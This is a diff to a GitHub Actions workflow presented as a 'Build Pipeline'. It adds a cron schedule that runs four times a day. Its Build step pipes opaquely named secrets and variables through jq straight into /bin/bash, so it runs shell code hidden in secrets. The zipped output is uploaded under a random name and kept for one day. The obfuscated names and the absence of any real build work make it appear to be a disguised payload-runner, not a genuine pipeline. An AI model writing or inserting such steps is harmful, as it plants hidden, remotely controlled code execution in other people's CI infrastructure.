@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '24 5,11,17,23 * * *'
 env:
   CI: true
 concurrency:
@@ -14,18 +16,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Build
         env:
-          x9485: ${{ secrets.x9485 }}
+          ypyyx25: ${{ secrets.ypyyx25 }}
         run: |
-          printf '%s' "$x9485" | jq -r .kdyup65307 | /bin/bash
-          echo $pp32 | jq -r .w56793 | /bin/bash
-          echo $fauc47269 | jq -r .lt131 | /bin/bash
-          echo $gyoqy60091 | jq -r .uelm04 | /bin/bash
-          echo $km80946 | jq -r .qzrop5860 | /bin/bash
-          echo $rbtg748 | jq -r .iks1 | /bin/bash
+          printf '%s' "$ypyyx25" | jq -r .qceps98 | /bin/bash
+          printf '%s' "$dsu37" | jq -r .lfdz8515 | /bin/bash
+          echo $a694 | jq -r .brr21 | /bin/bash
+          printf '%s' "$xzeh6" | jq -r .wq10 | /bin/bash
+          echo $wby5662 | jq -r .x156 | /bin/bash
+          printf '%s' "$jgoi3" | jq -r .h96085 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
         with:
-          name: NQllxNBM
+          name: q3BMZdLB
           path: "*.zip"
           retention-days: 1
